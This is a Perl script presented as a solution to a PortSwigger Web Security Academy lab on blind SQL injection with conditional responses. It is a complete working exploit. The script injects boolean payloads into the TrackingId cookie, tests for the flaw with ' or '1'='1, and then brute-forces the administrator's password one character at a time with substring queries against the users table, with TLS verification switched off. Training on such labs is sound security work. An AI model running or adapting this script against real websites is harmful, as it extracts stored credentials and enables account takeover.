#!usr/bin/env perl
#
#   Author: <wexe1@protonmail.com>
#   License: MIT
#
use strict;
use warnings;
use LWP::UserAgent;
use HTTP::CookieJar::LWP;
use Getopt::Long;
use Pod::Usage;
use feature 'say';
use Term::ANSIColor;

BEGIN {
    say colored("PortSwigger Web Security Academy", "bold yellow");
    say colored("Lab: Blind SQL injection with conditional responses", "bold yellow");
    say colored("Solution by weXe1", "bold blue");
    print "\n";
}

our $| = 1;

our(
    $url,
    $proxy,
    $maxLength,
    $help,
);

our $query = "(select password from users where username='administrator')";

GetOptions(
    'u|url=s'           => \$url,
    'p|proxy=s'         => \$proxy,
    'm|max-length=i'    => \$maxLength,
    'h|help'            => \$help
);

pod2usage(1) if $help;

pod2usage(1) unless $url;
$maxLength = 20 unless $maxLength;

our $ua = LWP::UserAgent->new(
    cookie_jar  => HTTP::CookieJar::LWP->new(),
    protocols_allowed   => ['http', 'https']
);
$ua->ssl_opts(verify_hostname => 0, SSL_verify_mode => 0x00);

# WARNING: install LWP::Protocol::connect if you want to use HTTPS proxy
# https://stackoverflow.com/questions/12116244/https-proxy-and-lwpuseragent/17787133#17787133
if ($proxy) {
    if ($proxy =~ /^https:\/\//) {
        $proxy =~ s/^https/connect/;
        $ua->proxy('https' => $proxy);
    } else {
        $ua->proxy('http' => $proxy);
    }
}

print colored("[*] SQL injection test... ", "cyan");
say makeRequest("TrackingId=' or '1'='1") ? colored("OK", "green") : colored("ERROR", "red");

say colored("[*] Obtaining password for user 'administrator', it may take a while... ", "cyan");

my $password = '';
for my $length (1..$maxLength) {
    for my $i (ord('!')..ord('~')) {
        my $letter = chr($i);
        next if $letter eq '%'; # 500 Internal server error for this char
        my $payload = &generatePayload($password . $letter);
        if (&makeRequest($payload)) {
            $password .= $letter;
            last;
        }
    }
    say colored("[$length] Found: $password" , "green");
    last if $length > length $password;
}

say colored("[*] Finished.", "bold magenta");

sub generatePayload {
    my $pass = shift;
    my $payload = "TrackingId=' or substring($query, 1, " . length($pass) . ") = '$pass";
    return $payload;
}

sub makeRequest {
    my $payload = shift;
    my $response = $ua->get($url, 'Cookie' => $payload);

    if ($response->is_success) {
        return $response->decoded_content =~ /welcome back!/ig ? 1 : 0;
    } else {
        say STDERR colored($response->status_line . ": [$payload]", "on_red");
        return 0;
    }
}

__END__

=head1 SYNOPSIS

 $ perl blind-conditional-responses.pl [options]

=head1 OPTIONS

     --url=<URL>                Target URL of the lab (required)
     --proxy=<URL>              HTTP or HTTPS proxy URL (optional)
     --max-length=<number>      Max length of brute forced password (optional)
     --help                     Prints this help

=cut
